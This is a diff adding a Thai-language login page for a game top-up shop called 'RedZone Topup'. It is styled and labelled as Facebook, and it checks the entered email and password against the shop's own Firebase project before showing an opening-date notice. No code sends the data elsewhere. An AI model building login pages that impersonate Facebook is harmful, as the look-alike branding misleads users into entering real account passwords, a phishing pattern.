@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>RedZone Topup - เข้าสู่ระบบ</title>
+  <style>
+    body {
+      background-color: #f0f2f5;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-container {
+      background: #fff;
+      padding: 2rem;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+      position: relative;
+    }
+    .login-container h1 {
+      color: #1877f2;
+      font-size: 3rem;
+      margin-bottom: 1rem;
+    }
+    .login-container input {
+      width: 100%;
+      padding: 0.9rem;
+      margin: 0.5rem 0;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 1rem;
+    }
+    .login-container button {
+      width: 100%;
+      padding: 0.9rem;
+      margin-top: 0.5rem;
+      font-size: 1rem;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    .login-btn {
+      background-color: #1877f2;
+      color: #fff;
+    }
+    .create-account {
+      background-color: #42b72a;
+      color: #fff;
+      margin-top: 1rem;
+    }
+    a {
+      display: block;
+      margin-top: 1rem;
+      color: #1877f2;
+      font-size: 0.95rem;
+      text-decoration: none;
+    }
+    .divider {
+      margin: 1rem 0;
+      border-top: 1px solid #dddfe2;
+    }
+    #login-message {
+      color: #f02849;
+      font-size: 0.95rem;
+      margin-bottom: 1rem;
+      display: none;
+    }
+    #success-popup {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #fff;
+      padding: 2rem;
+      width: 100%;
+      max-width: 380px;
+      border-radius: 10px;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
+      display: none;
+      z-index: 999;
+      animation: fadeInUp 0.4s ease;
+    }
+    @keyframes fadeInUp {
+      from {
+        opacity: 0;
+        transform: translate(-50%, -60%);
+      }
+      to {
+        opacity: 1;
+        transform: translate(-50%, -50%);
+      }
+    }
+    #success-popup h2 {
+      color: #e91e63;
+      margin-bottom: 0.5rem;
+    }
+    #success-popup p {
+      font-size: 0.95rem;
+      color: #333;
+      margin-bottom: 1.2rem;
+    }
+    #ig-link {
+      display: inline-block;
+      background: linear-gradient(45deg, #ff416c, #ff4b2b);
+      color: white;
+      padding: 0.7rem 1.2rem;
+      border-radius: 5px;
+      text-decoration: none;
+      font-weight: bold;
+    }
+    #ig-link:hover {
+      background: linear-gradient(45deg, #ff4b2b, #ff416c);
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <h1>Facebook</h1>
+    <p id="login-message">กรุณาเข้าสู่ระบบก่อน</p>
+    <input type="text" id="email" placeholder="อีเมลหรือเบอร์โทรศัพท์" />
+    <input type="password" id="password" placeholder="รหัสผ่าน" />
+    <button class="login-btn" id="login-btn">เข้าสู่ระบบ</button>
+    <a href="#">ลืมรหัสผ่านใช่ไหม?</a>
+    <div class="divider"></div>
+    <button class="create-account">สร้างบัญชีใหม่</button>
+  </div>
+
+  <div id="success-popup">
+    <h2>RedZone Topup</h2>
+    <p>ร้าน RedZone Topup จะเปิดให้บริการ<br><strong>วันที่ 1 พฤษภาคม พ.ศ. 2568 เวลา 16:00 น.</strong></p>
+    <a id="ig-link" href="https://www.instagram.com/redzone_topup?igsh=MXZtdG1zemZ3Zmh0cg==" target="_blank">ติดต่อผ่าน IG</a>
+  </div>
+
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCL1-u8VFbvW9763J53toozhSuP-xv4C-0",
+      authDomain: "redzone-topup.firebaseapp.com",
+      projectId: "redzone-topup",
+      storageBucket: "redzone-topup.firebasestorage.app",
+      messagingSenderId: "25853216897",
+      appId: "1:25853216897:web:5712eb71623b19e588a580",
+      measurementId: "G-3G126L0PF3"
+    };
+    firebase.initializeApp(firebaseConfig);
+
+    const params = new URLSearchParams(window.location.search);
+    if (params.get("redirect") === "true") {
+      document.getElementById("login-message").style.display = "block";
+    }
+
+    document.getElementById("login-btn").addEventListener("click", () => {
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      firebase.auth().signInWithEmailAndPassword(email, password)
+        .then((userCredential) => {
+          document.querySelector(".login-container").style.opacity = "0.1";
+          document.getElementById("success-popup").style.display = "block";
+        })
+        .catch((error) => {
+          alert("เข้าสู่ระบบไม่สำเร็จ: " + error.message);
+        });
+    });
+  </script>
+</body>
+</html>
